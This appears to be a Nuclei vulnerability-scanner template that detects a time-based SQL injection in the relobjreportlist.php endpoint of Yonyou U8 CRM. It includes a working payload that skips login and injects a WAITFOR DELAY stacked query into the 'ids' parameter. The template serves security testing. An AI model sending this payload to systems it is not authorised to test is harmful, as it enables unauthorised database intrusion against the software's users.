id: poc-yaml-yongyon-u8-crm-relobjreportlist-php-sqli
info:
  name: 用友U8 CRM relobjreportlist.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects an SQL injection vulnerability in 用友U8 CRM relobjreportlist.php.

variables:
  t1: '{{rand_int(3, 8)}}'
  t2: '{{to_number(t1) + 2}}'

flow: http(1) && http(2)

http:
  - id: "1"
    method: GET
    path:
      - "{{BaseURL}}/login/login.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "用友U8CRM"

  - id: "2"
    method: POST
    path:
      - "{{BaseURL}}/config/relobjreportlist.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID=bgsesstimeout-;
    body: DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:{{t1}}'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"success":true'
          - '"ID":null'
      - type: dsl
        dsl:
          - duration > {{t1}}
          - duration < {{t2}}
